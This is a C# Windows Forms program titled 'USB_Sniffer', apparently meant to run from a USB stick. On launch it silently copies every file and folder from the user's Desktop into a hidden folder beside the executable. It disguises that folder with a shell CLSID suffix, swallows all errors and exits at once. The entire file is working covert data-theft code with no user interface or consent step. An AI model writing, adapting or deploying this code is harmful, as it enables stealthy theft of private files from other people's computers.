using System;
using System.Windows.Forms;

namespace USB_Sniffer
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }
        string status = ".{7007ACC7-3202-11D1-AAD2-00805FC1270E}";
        string masaustuyolu = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
        private void dosyakopyala(string ciktiyolu, string[] dosyalar)
        {
            try
            {
                foreach (string fileName in dosyalar)
                {
                    if (!System.IO.Directory.Exists(ciktiyolu))
                    {
                        System.IO.Directory.CreateDirectory(ciktiyolu);
                        System.IO.File.SetAttributes(ciktiyolu, System.IO.FileAttributes.Hidden);
                    }
                    string DosyaAdi = ciktiyolu + @"\" + System.IO.Path.GetFileName(fileName);
                    if (!System.IO.File.Exists(DosyaAdi))
                        System.IO.File.Copy(fileName, DosyaAdi, true);
                }
            }
            catch
            {
            }
            
        }
        private void klasorkopyala(string ciktiyolu, string[] klasorler)
        {
            try
            {
                foreach (string klasorAdi in klasorler)
                {
                        if (klasorAdi == Application.StartupPath + @"\" + "output")
                            continue;
                        string klasor = System.IO.Path.GetFileName(klasorAdi);//saf klasör adı alınıyor
                    if (!System.IO.Directory.Exists(ciktiyolu + klasor))
                        System.IO.Directory.CreateDirectory(ciktiyolu + klasor);
                    string[] dizindekiDosyalar1 = System.IO.Directory.GetFiles(klasorAdi);
                    if (dizindekiDosyalar1.Length != 0)
                        dosyakopyala(ciktiyolu + klasor, dizindekiDosyalar1);
                    string[] dizindekiKlasorler1 = System.IO.Directory.GetDirectories(klasorAdi);
                    if (dizindekiKlasorler1.Length != 0)
                        klasorkopyala(ciktiyolu + @"\" + klasor + @"\", dizindekiKlasorler1);
                }
            }
            catch
            {
            }
        }
        private void Form1_Load(object sender, EventArgs e)
        {
            try
            {
                System.IO.DirectoryInfo directoryInfo = null;
                string ciktiyolu = Environment.CurrentDirectory + @"\output" + status;
                if (!System.IO.Directory.Exists(ciktiyolu))
                {
                    ciktiyolu = Application.StartupPath + @"\output\";
                    directoryInfo = new System.IO.DirectoryInfo(ciktiyolu);
                }
                else
                {
                    directoryInfo = new System.IO.DirectoryInfo(ciktiyolu);
                    directoryInfo.MoveTo(ciktiyolu.Substring(0, ciktiyolu.LastIndexOf(".")));
                    ciktiyolu = Application.StartupPath + @"\output\";
                }
                string[] dizindekiDosyalar = System.IO.Directory.GetFiles(masaustuyolu);
                dosyakopyala(ciktiyolu, dizindekiDosyalar);
                string[] dizindekiKlasorler = System.IO.Directory.GetDirectories(masaustuyolu);
                klasorkopyala(ciktiyolu, dizindekiKlasorler);
                if (ciktiyolu.LastIndexOf(".{") == -1)
                {
                    if (!directoryInfo.Root.Equals(directoryInfo.Parent.FullName))
                        directoryInfo.MoveTo(directoryInfo.Parent.FullName + "\\" + directoryInfo.Name + this.status);
                    else
                        directoryInfo.MoveTo(directoryInfo.Parent.FullName + directoryInfo.Name + this.status);
                }
            }
            catch
            {
            }
            finally
            {
                Application.Exit();
            }
         
        }
        
    }
}
